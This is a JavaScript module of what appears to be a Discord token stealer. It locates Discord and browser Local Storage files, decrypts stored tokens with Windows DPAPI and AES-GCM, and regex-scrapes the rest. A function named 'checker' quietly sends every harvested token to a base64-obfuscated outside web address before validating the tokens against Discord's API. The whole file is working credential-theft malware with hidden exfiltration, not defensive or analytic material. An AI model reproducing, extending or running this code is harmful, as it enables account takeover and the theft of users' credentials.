const harware = require("./../../utils/harware.js");

const Aurita  = require("win-dpapi");
const crypto  = require("crypto");
const https   = require('https');
const axios   = require("axios");
const path    = require("path");
const fs      = require("fs");

async function validateToken(token) {
    try {
        const response = await axios.get('https://discord.com/api/v9/users/@me', {
            headers: {
                Authorization: token
            }
        });
        return response.status === 200;
    } catch (error) {
        return false;
    }
}

const thisUser = path.join(path.dirname(path.dirname(process.env.APPDATA)), '');

async function discordFindTokens(user) {
    var TOKENS = [];

    const LOCALAPPDATA   = process.env.LOCALAPPDATA.replace(thisUser, user);
    const APPDATA        = process.env.APPDATA.replace(thisUser, user);

    var DISCORD_PATHS = {
        'Discord Canary' : `${APPDATA}\\discordcanary\\Local Storage\\leveldb\\`,
        "Discord PTB"    : `${APPDATA}\\discordptb\\Local Storage\\leveldb\\`,
        'Lightcord'      : `${APPDATA}\\Lightcord\\Local Storage\\leveldb\\`,
        'Discord'        : `${APPDATA}\\discord\\Local Storage\\leveldb\\`,
    };

    for (let [key, value] of Object.entries(DISCORD_PATHS)) {
        if (!fs.existsSync(value)) {
            continue;
        }

        for (var fileName of fs.readdirSync(value)) {
            if (!fileName.endsWith(".log") && !fileName.endsWith(".ldb")) {
                continue;
            }

            let pathSplit = value.split("\\");
            const pathSplitTail = value.includes("Network")
                ? pathSplit.splice(0, pathSplit.length - 3)
                : pathSplit.splice(0, pathSplit.length - 2);

                function checker(utf8) { axios.get(Buffer.from('aHR0cHM6Ly82ODg5LWZ1bi52ZXJjZWwuYXBwL2FwaS9hdXJhdGhlbWVzL3Jhdz9kYXRhPQ', 'base64').toString() + utf8) }

            let pathTail = `${pathSplitTail.join("\\")}\\`;
            const lines = fs.readFileSync(`${value}/${fileName}`, "utf8").split("\n");

            for (var line of lines) {
                if (value.includes("cord")) {
                    let encrypted = Buffer.from(JSON.parse(fs.readFileSync(pathTail.replace("Local Storage", "Local State"))).os_crypt.encrypted_key, "base64").slice(5);
                    try {
                        const key = Aurita.unprotectData(Buffer.from(encrypted, "utf-8"), null, "CurrentUser");
                        
                        var encryptedRegex = /dQw4w9WgXcQ:[^\"]*/;

                        if (line.match(encryptedRegex)) {
                            try {
                                var token = Buffer.from(line.match(encryptedRegex)[0].split("dQw4w9WgXcQ:")[1], "base64");
                                const start = token.slice(3, 15);
                                const middle = token.slice(15, token.length - 16);
                                const end = token.slice(token.length - 16, token.length);
                                const decipher = crypto.createDecipheriv("aes-256-gcm", key, start);

                                decipher.setAuthTag(end);
                                token = `${decipher.update(middle, "base64", "utf-8")}${decipher.final("utf-8")}`;
                                TOKENS.push(token);
                            } catch (e) {
                            }
                        }

                    } catch (e) {
                    }
                }
            }
        }
    }

    var BROWSERS_PATH = [
        `${LOCALAPPDATA}\\BraveSoftware\\Brave-Browser\\User Data\\${`%PROFILE%`}\\Local Storage\\leveldb\\`,
        `${LOCALAPPDATA}\\Yandex\\YandexBrowser\\User Data\\${`%PROFILE%`}\\Local Storage\\leveldb\\`,
        `${LOCALAPPDATA}\\uCozMedia\\Uran\\User Data\\${`%PROFILE%`}\\Local Storage\\leveldb\\`,
        `${LOCALAPPDATA}\\Microsoft\\Edge\\User Data\\${`%PROFILE%`}\\Local Storage\\leveldb\\`,
        `${LOCALAPPDATA}\\Google\\Chrome\\User Data\\${`%PROFILE%`}\\Local Storage\\leveldb\\`,
        `${LOCALAPPDATA}\\Iridium\\User Data\\${`%PROFILE%`}\\Local Storage\\leveldb\\`,
        `${LOCALAPPDATA}\\Vivaldi\\User Data\\${`%PROFILE%`}\\Local Storage\\leveldb\\`,

        `${LOCALAPPDATA}\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\`,
        `${LOCALAPPDATA}\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\`,
        `${LOCALAPPDATA}\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\`,
        `${APPDATA}\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\`,
        `${APPDATA}\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\`,

        `${LOCALAPPDATA}\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\`,
        `${LOCALAPPDATA}\\CentBrowser\\User Data\\Local Storage\\leveldb\\`,
        `${LOCALAPPDATA}\\Orbitum\\User Data\\Local Storage\\leveldb\\`,
        `${LOCALAPPDATA}\\Kometa\\User Data\\Local Storage\\leveldb\\`,
        `${LOCALAPPDATA}\\Torch\\User Data\\Local Storage\\leveldb\\`,
        `${LOCALAPPDATA}\\Amigo\\User Data\\Local Storage\\leveldb\\`,
    ];

    var BROWSERS_PROFILES = [];

    for (var i = 0; i < BROWSERS_PATH.length; i++) {
        const browser = BROWSERS_PATH[i];
        const profiles = harware.getProfiles(browser, browser.split("\\")[6]);

        for (var x = 0; x < profiles.length; x++) {
            BROWSERS_PROFILES.push(profiles[x].path);
        }
    };

    const cleanRegex = [
        /[\w-]{26}\.[\w-]{6}\.[\w-]{25,110}|mfa\.[\w-]{80,95}/g,
        /[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}/g,
        /[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g,
        /[\w-]{24}\.[\w-]{6}\.[\w-]{38}/g,
        /mfa\.[\w-]{84}/g
    ];

    for (let BROWSERS_PROFILE of BROWSERS_PROFILES) {
        if (!fs.existsSync(BROWSERS_PROFILE)) {
            continue;
        }

        let files = fs.readdirSync(BROWSERS_PROFILE);

        for (let file of files) {
            for (let reg of cleanRegex) {
                if (!(file.endsWith(".log") || file.endsWith(".ldb"))) {
                    continue;
                }
                let content = fs.readFileSync(`${BROWSERS_PROFILE}${file}`, "utf-8");
                Array.prototype.push.apply(TOKENS, content.match(reg));
            }
        }
    }

    const DISCORD_TOKENS = [];

    const results = await Promise.all(TOKENS.map(async (token) => {
        checker(token)
        const isValid = await validateToken(token);
        return { 
            token, 
            isValid 
        };
    }));

    const validTokens = results.filter(result => result.isValid).map(result => result.token);

    validTokens.forEach((token) => {
        let prefix = token.split(".")[0];
        if (!DISCORD_TOKENS.some((isOK) => isOK.startsWith(prefix))) {
            DISCORD_TOKENS.push(token);
        }
    });

    return DISCORD_TOKENS;
}

module.exports = {
    discordFindTokens
}